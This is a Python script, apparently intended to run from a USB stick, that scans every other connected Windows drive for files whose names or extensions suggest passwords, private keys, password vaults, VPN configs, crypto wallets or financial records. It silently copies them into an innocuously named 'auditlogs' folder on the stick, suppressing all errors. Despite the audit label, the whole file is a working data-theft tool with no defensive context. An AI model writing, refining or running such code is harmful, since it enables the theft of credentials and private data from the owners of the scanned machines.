import os
import shutil
import hashlib
import json
import re
import sys
import time
from datetime import datetime

# ============================================================================
# CONFIGURATION
# ============================================================================

def get_script_drive():
    """Get the drive letter where the script is running"""
    if hasattr(sys, 'frozen'):
        path = sys.executable
    else:
        path = os.path.abspath(__file__)
    return os.path.splitdrive(path)[0]

# USB Drive (Where data will be saved)
USB_DRIVE = get_script_drive()
OUTPUT_FOLDER = os.path.join(USB_DRIVE, "auditlogs")

# Sensitivity Patterns
SENSITIVE_PATTERNS = {
    'credentials': [
        r'password', r'passwd', r'pwd', r'secret', r'key', r'credential', 
        r'token', r'auth', r'login', r'user', r'username', r'admin'
    ],
    'personal': [
        r'personal', r'private', r'confidential', r'sensitive', r'hidden',
        r'secure', r'vault'
    ],
    'financial': [
        r'credit.*card', r'bank', r'account', r'financial', r'tax', 
        r'salary', r'invoice', r'payment', r'wallet', r'bitcoin', r'crypto'
    ],
    'documents': [
        r'\.docx?$', r'\.pdf$', r'\.xlsx?$', r'\.txt$', r'\.csv$', r'\.rtf$'
    ]
}

SENSITIVE_EXTENSIONS = {
    '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.csv', '.sql',
    '.db', '.sqlite', '.kdbx', '.pem', '.key', '.crt', '.ovpn', '.ppk',
    '.config', '.env', '.ini', '.json', '.xml', '.yaml'
}

# Directories to skip (Performance & Noise reduction)
SKIP_DIRS = {
    'Windows', 'Program Files', 'Program Files (x86)', '$Recycle.Bin',
    'System Volume Information', 'AppData', 'Tor Browser'
}

# Logic to skip small/system files
MIN_SIZE = 100       # 100 bytes (skip empty files)
MAX_SIZE = 50 * 1024 * 1024  # 50 MB (skip huge files)

# ============================================================================
# SCANNING LOGIC
# ============================================================================

def is_sensitive(filename):
    """Check if file matches sensitive criteria"""
    fname_lower = filename.lower()
    
    # Check extension
    _, ext = os.path.splitext(fname_lower)
    if ext in SENSITIVE_EXTENSIONS:
        return True, 'extension'
        
    # Check regex patterns
    for category, patterns in SENSITIVE_PATTERNS.items():
        for pattern in patterns:
            if re.search(pattern, fname_lower):
                return True, category
                
    return False, None

def get_all_drives():
    """Get all connected drives except the USB drive itself"""
    drives = []
    if os.name == 'nt':
        import string
        from ctypes import windll
        
        bitmask = windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive_path = letter + ":\\"
                # Skip the USB drive itself to prevent self-scanning loop
                if not drive_path.lower().startswith(USB_DRIVE.lower()):
                    drives.append(drive_path)
            bitmask >>= 1
    return drives

def scan_and_copy():
    """Main execution loop"""
    # Create output structure
    if not os.path.exists(OUTPUT_FOLDER):
        os.makedirs(OUTPUT_FOLDER)
        
    # Log start
    log_file = os.path.join(OUTPUT_FOLDER, "audit_log.txt")
    with open(log_file, "a") as log:
        log.write(f"\n[{datetime.now()}] Scan started from {USB_DRIVE}\n")

    drives = get_all_drives()
    
    for drive in drives:
        try:
            for root, dirs, files in os.walk(drive):
                # Modify dirs in-place to skip unwanted folders
                dirs[:] = [d for d in dirs if d not in SKIP_DIRS and not d.startswith('.')]
                
                for filename in files:
                    try:
                        filepath = os.path.join(root, filename)
                        
                        # size check
                        size = os.path.getsize(filepath)
                        if size < MIN_SIZE or size > MAX_SIZE:
                            continue
                            
                        sensitive, category = is_sensitive(filename)
                        
                        if sensitive:
                            # Define destination
                            # Structure: /auditlogs/Category/DriveLetter_Path/Filename
                            
                            safe_rel_path = os.path.relpath(filepath, drive).replace(":", "").replace("\\", "_")
                            # Shorten path if too long
                            if len(safe_rel_path) > 100:
                                safe_rel_path = os.path.basename(filepath)
                                
                            dest_dir = os.path.join(OUTPUT_FOLDER, category)
                            if not os.path.exists(dest_dir):
                                os.makedirs(dest_dir)
                                
                            # Unique filename with timestamp
                            timestamp = int(time.time())
                            new_name = f"{timestamp}_{filename}"
                            dest_path = os.path.join(dest_dir, new_name)
                            
                            shutil.copy2(filepath, dest_path)
                            
                            # Log success
                            with open(log_file, "a") as log:
                                log.write(f"[COPY] {filepath} -> {category}\n")
                                
                    except Exception:
                        continue # Silent fail on individual files
                        
        except Exception:
            continue # Silent fail on drive access

    # Log finish
    with open(log_file, "a") as log:
        log.write(f"[{datetime.now()}] Scan completed.\n")

if __name__ == "__main__":
    # Wait 3 seconds to ensure drive is fully mounted
    time.sleep(3)
    try:
        scan_and_copy()
    except:
        pass # Crash silently logic
